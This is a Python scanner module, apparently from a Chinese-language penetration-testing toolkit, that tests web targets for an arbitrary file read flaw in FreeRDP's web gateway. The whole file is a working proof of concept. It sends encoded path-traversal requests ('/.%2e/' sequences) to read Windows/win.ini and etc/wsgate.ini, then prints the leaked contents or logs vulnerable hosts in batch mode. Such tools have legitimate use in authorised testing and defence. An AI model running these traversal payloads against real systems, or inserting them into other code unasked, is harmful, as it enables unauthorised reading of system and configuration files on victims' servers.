#!/user/bin/env python3
# -*- coding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class FreeRDP_File_Read_Scan:
    def send_payload(self,url):
        url2 = url + '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/Windows/win.ini'
        try:
            req = requests.get(url2,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "16-bit" in req.text and req.status_code == 200:
                OutPrintInfoSuc("FreeRDP", f"存在FreeRDP任意文件读取漏洞 {url2}")
                if not self.batch:
                    OutPrintInfo("FreeRDP", f"Response: \n{req.text.strip()}")
                else:
                    OutPutFile("freerdp_file_read.txt",f"存在FreeRDP任意文件读取漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("FreeRDP", f"不存在FreeRDP任意文件读取漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("FreeRDP", "目标请求出错")
    def send_payload2(self,url):
        url2 = url + '/.%2e/etc/wsgate.ini'
        try:
            req = requests.get(url2,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "C:\\" in req.text and req.status_code == 200:
                OutPrintInfoSuc("FreeRDP", f"存在FreeRDP任意文件读取漏洞 {url2}")
                if not self.batch:
                    OutPrintInfo("FreeRDP", f"Response: \n{req.text.strip()}")
                else:
                    OutPutFile("freerdp_file_read.txt", f"存在FreeRDP任意文件读取漏洞 {url2}")

            else:
                if not self.batch:
                    OutPrintInfo("FreeRDP", f"不存在FreeRDP任意文件读取漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("FreeRDP", "目标请求出错")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.header, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("FreeRDP", "开始检测FreeRDP任意文件读取漏洞...")
            OutPrintInfo("FreeRDP", "开始检测POC-1...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("FreeRDP", "开始检测POC-2...")
        self.send_payload2(url)
        if not self.batch:
            OutPrintInfo("FreeRDP", "FreeRDP任意文件读取漏洞检测结束")